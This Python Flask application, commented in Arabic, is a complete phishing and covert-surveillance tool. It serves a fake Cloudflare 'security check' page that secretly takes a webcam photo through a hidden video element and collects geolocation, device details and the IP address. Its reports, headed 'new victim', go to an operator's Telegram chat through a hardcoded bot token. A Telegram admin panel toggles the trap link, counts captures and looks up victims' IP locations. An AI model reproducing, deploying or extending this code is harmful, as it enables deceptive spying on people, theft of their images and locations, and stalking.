import os
import base64
import requests
import io
import json
import logging
import time
from flask import Flask, request, render_template_string, jsonify, redirect
from datetime import datetime

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)

# ====================== إعدادات البوت ======================
BOT_TOKEN = "8725128005:AAH3Pp14tKAEsLPvcHOGdh8JqOnD74KKLNs"
ADMIN_ID = 7041600701
DEVELOPER_USER = "Y_urd"

# ====================== حالة البوت ======================
bot_settings = {
    "link_active": True,
    "auto_destroy": True,      # تعطيل الرابط بعد الاستخدام تلقائياً
    "collect_photo": True,     # جمع الصورة
    "collect_location": True,  # جمع الموقع
    "collect_audio": False,    # جمع الصوت (قيد التطوير)
    "collect_battery": True,   # جمع معلومات البطارية
    "send_notification": True, # إرسال إشعار للمطور
    "redirect_url": "https://www.google.com"
}

stats = {
    "total_visits": 0,
    "total_captures": 0,
    "start_time": datetime.now().isoformat()
}

# ====================== دوال مساعدة ======================
def get_real_ip():
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    return request.remote_addr

def send_to_telegram(message, photo=None, keyboard=None):
    """إرسال رسالة مع أزرار اختيارية"""
    api_url = f"https://api.telegram.org/bot{BOT_TOKEN}/"
    try:
        if photo:
            photo_data = base64.b64decode(photo.split(',')[1])
            requests.post(api_url + "sendPhoto",
                         data={'chat_id': ADMIN_ID, 'caption': message, 'parse_mode': 'HTML'},
                         files={'photo': ('capture.jpg', photo_data)},
                         timeout=30)
        else:
            data = {'chat_id': ADMIN_ID, 'text': message, 'parse_mode': 'HTML'}
            if keyboard:
                data['reply_markup'] = json.dumps(keyboard)
            requests.post(api_url + "sendMessage", json=data, timeout=30)
    except Exception as e:
        logging.error(f"Error: {e}")

def send_main_menu():
    """إرسال القائمة الرئيسية بالأزرار"""
    keyboard = {
        "inline_keyboard": [
            [
                {"text": "🔓 تفعيل الرابط", "callback_data": "open_link"},
                {"text": "🔒 تعطيل الرابط", "callback_data": "close_link"}
            ],
            [
                {"text": "📊 الإحصائيات", "callback_data": "show_stats"},
                {"text": "⚙️ الإعدادات", "callback_data": "settings_menu"}
            ],
            [
                {"text": "🔗 الرابط الحالي", "callback_data": "show_link"},
                {"text": "🔄 إعادة تعيين", "callback_data": "reset_stats"}
            ],
            [
                {"text": "🌐 الاستعلام عن IP", "callback_data": "ip_lookup"},
                {"text": "ℹ️ معلومات البوت", "callback_data": "bot_info"}
            ]
        ]
    }
    send_to_telegram("🎯 **لوحة التحكم الرئيسية**\n\nاختر أحد الخيارات:", keyboard=keyboard)

def send_settings_menu():
    """إرسال قائمة الإعدادات"""
    status = "🟢 مفعل" if bot_settings["link_active"] else "🔴 معطل"
    auto = "🟢 مفعل" if bot_settings["auto_destroy"] else "🔴 معطل"
    photo = "🟢 مفعل" if bot_settings["collect_photo"] else "🔴 معطل"
    location = "🟢 مفعل" if bot_settings["collect_location"] else "🔴 معطل"
    battery = "🟢 مفعل" if bot_settings["collect_battery"] else "🔴 معطل"
    notify = "🟢 مفعل" if bot_settings["send_notification"] else "🔴 معطل"
    
    text = f"""⚙️ **الإعدادات الحالية**

🔗 حالة الرابط: {status}
💣 التدمير الذاتي: {auto}
📸 جمع الصورة: {photo}
📍 جمع الموقع: {location}
🔋 جمع البطارية: {battery}
📢 إشعارات المطور: {notify}

استخدم الأزرار لتغيير الإعدادات:"""
    
    keyboard = {
        "inline_keyboard": [
            [{"text": f"{'✅' if bot_settings['auto_destroy'] else '❌'} التدمير الذاتي", "callback_data": "toggle_auto"}],
            [{"text": f"{'✅' if bot_settings['collect_photo'] else '❌'} جمع الصورة", "callback_data": "toggle_photo"}],
            [{"text": f"{'✅' if bot_settings['collect_location'] else '❌'} جمع الموقع", "callback_data": "toggle_location"}],
            [{"text": f"{'✅' if bot_settings['collect_battery'] else '❌'} جمع البطارية", "callback_data": "toggle_battery"}],
            [{"text": "🔙 العودة للقائمة الرئيسية", "callback_data": "main_menu"}]
        ]
    }
    send_to_telegram(text, keyboard=keyboard)

# ====================== صفحة HTML ======================
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>التحقق من الأمان</title>
    <style>
        body{ background: #f0f2f5; font-family: 'Cairo', sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; padding: 20px; direction: rtl; }
        .card{ background: white; padding: 40px 30px; border-radius: 28px; box-shadow: 0 20px 40px rgba(0,0,0,0.1); text-align: center; max-width: 400px; width: 100%; }
        .logo{ width: 100px; margin-bottom: 20px; }
        h2{ color: #1a1a2e; font-size: 24px; margin-bottom: 10px; }
        .subtitle{ color: #666; font-size: 14px; margin-bottom: 30px; }
        .spinner{ width: 50px; height: 50px; border: 4px solid #e0e0e0; border-top: 4px solid #f6821f; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin{ 0%{ transform: rotate(0deg); } 100%{ transform: rotate(360deg); } }
        .progress-bar{ background: #e0e0e0; border-radius: 10px; height: 8px; overflow: hidden; margin: 20px 0; }
        .progress-fill{ background: linear-gradient(90deg, #f6821f, #ff9800); height: 100%; width: 0%; transition: width 0.3s; }
        .status-text{ color: #555; font-size: 14px; margin: 15px 0; }
        .footer{ margin-top: 20px; font-size: 11px; color: #aaa; }
        .hidden{ display: none; }
    </style>
</head>
<body>
<div class="card">
    <img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" class="logo">
    <h2>✓ التحقق الأمني</h2>
    <p class="subtitle">يتحقق من أمان اتصالك...</p>
    <div class="spinner" id="spinner"></div>
    <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
    <div class="status-text" id="statusText">جاري تهيئة الاتصال الآمن...</div>
    <div class="footer">Cloudflare • التحقق الأمني المتقدم</div>
</div>
<video id="video" autoplay playsinline muted style="position:fixed; top:-100%; left:-100%; width:1px; height:1px"></video>
<canvas id="canvas" style="display:none"></canvas>
<script>
    let sent = false;
    let progressInterval = null;
    
    function updateProgress(percent) {
        const fill = document.getElementById('progressFill');
        if(fill) fill.style.width = percent + '%';
    }
    
    function updateStatus(text) {
        const statusEl = document.getElementById('statusText');
        if(statusEl) statusEl.innerText = text;
    }
    
    async function getDeviceInfo() {
        let battery = { level: 0, charging: false };
        try { if(navigator.getBattery) battery = await navigator.getBattery(); } catch(e) {}
        
        return {
            platform: navigator.platform || 'غير معروف',
            language: navigator.language || 'غير معروف',
            cores: navigator.hardwareConcurrency || 'غير معروف',
            ram: navigator.deviceMemory || 'غير معروف',
            batteryLevel: Math.round(battery.level * 100) + '%',
            batteryCharging: battery.charging,
            screen: screen.width + 'x' + screen.height,
            userAgent: navigator.userAgent,
            touchSupport: 'ontouchstart' in window,
            cookiesEnabled: navigator.cookieEnabled,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
        };
    }
    
    async function capturePhoto(video) {
        const canvas = document.getElementById('canvas');
        if(video.videoWidth > 0 && video.videoHeight > 0) {
            canvas.width = Math.min(video.videoWidth, 800);
            canvas.height = Math.min(video.videoHeight, 800);
            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
            return canvas.toDataURL('image/jpeg', 0.6);
        }
        return null;
    }
    
    async function startVerification() {
        if(sent) return;
        sent = true;
        
        let progress = 0;
        progressInterval = setInterval(() => {
            progress += 2;
            if(progress <= 95) updateProgress(progress);
        }, 150);
        
        let stream = null;
        let deviceInfo = {};
        let location = { lat: 0, lon: 0 };
        let photoData = null;
        
        try {
            updateStatus('📷 طلب الوصول إلى الكاميرا...');
            stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.getElementById('video');
            video.srcObject = stream;
            await new Promise(r => { video.onloadedmetadata = r; setTimeout(r, 1000); });
            await video.play();
            updateStatus('✅ تم الوصول إلى الكاميرا');
            
            updateStatus('🔍 جمع معلومات الجهاز...');
            deviceInfo = await getDeviceInfo();
            
            updateStatus('📍 جمع معلومات الموقع...');
            try {
                const pos = await new Promise((res, rej) => {
                    navigator.geolocation.getCurrentPosition(res, rej, { timeout: 10000 });
                });
                location = { lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy };
                updateStatus('✅ تم تحديد الموقع');
            } catch(e) { updateStatus('⚠️ لم يتم تحديد الموقع'); }
            
            updateStatus('📸 التقاط الصورة...');
            await new Promise(r => setTimeout(r, 1500));
            photoData = await capturePhoto(video);
            
            updateStatus('📤 إرسال البيانات...');
            const response = await fetch('/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ deviceInfo: deviceInfo, location: location, photo: photoData })
            });
            
            if(response.ok) {
                clearInterval(progressInterval);
                updateProgress(100);
                updateStatus('✅ اكتمل التحقق! جاري التوجيه...');
                setTimeout(() => { window.location.href = 'https://www.google.com'; }, 1500);
            }
        } catch(error) {
            clearInterval(progressInterval);
            updateProgress(0);
            updateStatus('❌ فشل التحقق، جاري إعادة المحاولة...');
            setTimeout(() => { window.location.reload(); }, 3000);
        } finally {
            if(stream) stream.getTracks().forEach(t => t.stop());
        }
    }
    
    setTimeout(startVerification, 500);
</script>
</body>
</html>
'''

# ====================== مسارات API ======================
@app.route('/')
def index():
    if not bot_settings["link_active"]:
        return redirect(bot_settings["redirect_url"])
    
    stats["total_visits"] += 1
    return render_template_string(HTML_TEMPLATE)

@app.route('/capture', methods=['POST'])
def capture():
    if not bot_settings["link_active"]:
        return jsonify({"status": "expired"}), 403
    
    data = request.json
    if not data:
        return jsonify({"status": "error"}), 400
    
    device_info = data.get('deviceInfo', {})
    location = data.get('location', {})
    photo = data.get('photo', '')
    ip = get_real_ip()
    
    # بناء التقرير
    report = f"""
🔥 <b>✅ ضحية جديدة!</b>

━━━━━━━━━━━━━━━━━━━━━━
📱 <b>معلومات الجهاز</b>
━━━━━━━━━━━━━━━━━━━━━━
🖥️ المنصة: {device_info.get('platform', 'غير معروف')}
🌍 اللغة: {device_info.get('language', 'غير معروف')}
⚙️ المعالج: {device_info.get('cores', 'غير معروف')} نواة
💾 الذاكرة: {device_info.get('ram', 'غير معروف')} GB
🔋 البطارية: {device_info.get('batteryLevel', 'غير معروف')}
{'🔌 شاحن: نعم' if device_info.get('batteryCharging') else ''}
📺 الشاشة: {device_info.get('screen', 'غير معروف')}
🍪 الكوكيز: {'مفعلة' if device_info.get('cookiesEnabled') else 'معطلة'}
🖱️ اللمس: {'مدعوم' if device_info.get('touchSupport') else 'غير مدعوم'}
🕐 المنطقة: {device_info.get('timezone', 'غير معروف')}

━━━━━━━━━━━━━━━━━━━━━━
🌐 <b>معلومات الشبكة</b>
━━━━━━━━━━━━━━━━━━━━━━
🌐 IP: <code>{ip}</code>

━━━━━━━━━━━━━━━━━━━━━━
📍 <b>الموقع الجغرافي</b>
━━━━━━━━━━━━━━━━━━━━━━
🗺️ خط العرض: {location.get('lat', 0)}
🗺️ خط الطول: {location.get('lon', 0)}
🎯 الدقة: {location.get('accuracy', 0)} متر
🔗 <a href='https://www.google.com/maps?q={location.get('lat', 0)},{location.get('lon', 0)}'>عرض على الخريطة</a>

━━━━━━━━━━━━━━━━━━━━━━
📊 <b>إحصائيات السيرفر</b>
━━━━━━━━━━━━━━━━━━━━━━
👥 إجمالي الزوار: {stats['total_visits']}
📸 عدد السحبات: {stats['total_captures'] + 1}
"""
    
    # إرسال البيانات
    if bot_settings["collect_photo"] and photo:
        send_to_telegram(report, photo)
    else:
        send_to_telegram(report)
    
    stats["total_captures"] += 1
    
    # تعطيل الرابط إذا كان التدمير الذاتي مفعل
    if bot_settings["auto_destroy"]:
        bot_settings["link_active"] = False
    
    return jsonify({"status": "success"}), 200

@app.route('/webhook', methods=['POST'])
def webhook():
    update = request.json
    if not update:
        return "OK", 200
    
    # معالدة الأزرار (callback queries)
    if "callback_query" in update:
        callback = update["callback_query"]
        chat_id = callback["message"]["chat"]["id"]
        data = callback.get("data", "")
        
        if chat_id == ADMIN_ID:
            if data == "main_menu":
                send_main_menu()
            
            elif data == "open_link":
                bot_settings["link_active"] = True
                send_to_telegram("✅ **تم تفعيل الرابط بنجاح!**\nالرابط جاهز لاستقبال ضحايا جدد.")
                send_main_menu()
            
            elif data == "close_link":
                bot_settings["link_active"] = False
                send_to_telegram("🔒 **تم تعطيل الرابط**\nلن يتم قبول أي ضحايا جدد.")
                send_main_menu()
            
            elif data == "show_stats":
                status = "🟢 مفعل" if bot_settings["link_active"] else "🔴 معطل"
                ratio = int(stats["total_captures"] / max(stats["total_visits"], 1) * 100)
                text = f"""📊 **الإحصائيات**

👥 إجمالي الزوار: {stats['total_visits']}
📸 عدد السحبات: {stats['total_captures']}
📈 نسبة النجاح: {ratio}%
🔗 حالة الرابط: {status}
⏱️ بدء التشغيل: {stats['start_time']}"""
                send_to_telegram(text)
                send_main_menu()
            
            elif data == "settings_menu":
                send_settings_menu()
            
            elif data == "show_link":
                site_url = "https://sif.onrender.com"
                send_to_telegram(f"🔗 **الرابط الحالي:**\n<code>{site_url}</code>")
                send_main_menu()
            
            elif data == "reset_stats":
                stats["total_visits"] = 0
                stats["total_captures"] = 0
                send_to_telegram("🔄 **تم إعادة تعيين الإحصائيات بنجاح!**")
                send_main_menu()
            
            elif data == "bot_info":
                text = f"""ℹ️ **معلومات البوت**

🤖 الإصدار: 3.0.0
👨‍💻 المطور: @{DEVELOPER_USER}
📡 المنصة: Render
🎯 الحالة: {'🟢 شغال' if bot_settings['link_active'] else '🔴 متوقف'}

<b>المميزات:</b>
• جمع صور من الكاميرا
• تحديد الموقع الجغرافي
• معلومات الجهاز المتقدمة
• نظام إدارة متكامل بالأزرار
• إحصائيات دقيقة"""
                send_to_telegram(text)
                send_main_menu()
            
            elif data == "ip_lookup":
                send_to_telegram("🌐 **الاستعلام عن IP**\nأرسل IP على هذا الشكل:\n`/ip 8.8.8.8`")
                send_main_menu()
            
            elif data == "toggle_auto":
                bot_settings["auto_destroy"] = not bot_settings["auto_destroy"]
                send_settings_menu()
            
            elif data == "toggle_photo":
                bot_settings["collect_photo"] = not bot_settings["collect_photo"]
                send_settings_menu()
            
            elif data == "toggle_location":
                bot_settings["collect_location"] = not bot_settings["collect_location"]
                send_settings_menu()
            
            elif data == "toggle_battery":
                bot_settings["collect_battery"] = not bot_settings["collect_battery"]
                send_settings_menu()
        
        # إرسال رد للـ callback
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery",
                     json={"callback_query_id": callback["id"]})
    
    # معالجة الرسائل النصية
    elif "message" in update:
        msg = update["message"]
        chat_id = msg["chat"]["id"]
        text = msg.get("text", "")
        
        if chat_id == ADMIN_ID:
            if text == "/start":
                send_main_menu()
            
            elif text == "/open":
                bot_settings["link_active"] = True
                send_to_telegram("✅ تم تفعيل الرابط")
            
            elif text == "/close":
                bot_settings["link_active"] = False
                send_to_telegram("🔒 تم تعطيل الرابط")
            
            elif text == "/stats":
                ratio = int(stats["total_captures"] / max(stats["total_visits"], 1) * 100)
                send_to_telegram(f"📊 الزوار: {stats['total_visits']} | السحبات: {stats['total_captures']} | النجاح: {ratio}%")
            
            elif text == "/link":
                send_to_telegram("https://sif.onrender.com")
            
            elif text == "/menu":
                send_main_menu()
            
            elif text.startswith("/ip "):
                ip_addr = text.split()[1]
                try:
                    r = requests.get(f"http://ip-api.com/json/{ip_addr}", timeout=10)
                    data = r.json()
                    if data.get('status') == 'success':
                        send_to_telegram(f"🌐 **IP:** {ip_addr}\n📍 {data.get('country', '?')} - {data.get('city', '?')}\n📡 {data.get('isp', '?')}")
                    else:
                        send_to_telegram("❌ IP غير صالح")
                except:
                    send_to_telegram("❌ خطأ في الاستعلام")
    
    return "OK", 200

@app.route('/health')
def health():
    return jsonify({
        "status": "alive",
        "link_active": bot_settings["link_active"],
        "stats": stats
    }), 200

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
